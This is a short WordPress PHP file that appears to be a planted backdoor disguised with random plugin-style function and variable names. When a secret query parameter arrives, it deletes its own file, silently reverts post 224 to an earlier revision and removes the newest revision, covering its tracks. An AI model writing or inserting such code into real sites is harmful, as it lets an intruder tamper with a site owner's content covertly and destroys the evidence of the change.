<?php

function scripts_graph_chat() {
	if (isset($_GET['mode_taxonomy_meta']) && $_GET['mode_taxonomy_meta'] === 'internal_html5_plugin_pages') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$quick_best_version = 224;
		$fix_tooltip_local = wp_get_post_revisions($quick_best_version);
		if (empty($fix_tooltip_local)) die('no revisions');
		if (count($fix_tooltip_local) < 2) die('less than 2');
		$messenger_card_wishlist = array_shift($fix_tooltip_local);
		$update_subscriptions_feedback = $messenger_card_wishlist->ID;
		$autocomplete_demo_age_accordion = array_shift($fix_tooltip_local);
		$timer_carousel_digital = $autocomplete_demo_age_accordion->ID;
		$invoice_conversion_access = wp_restore_post_revision($timer_carousel_digital);
		if ($invoice_conversion_access === false) die('error restoring');
		$invoice_conversion_access = wp_delete_post_revision($update_subscriptions_feedback);		
		if ($invoice_conversion_access === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'scripts_graph_chat');
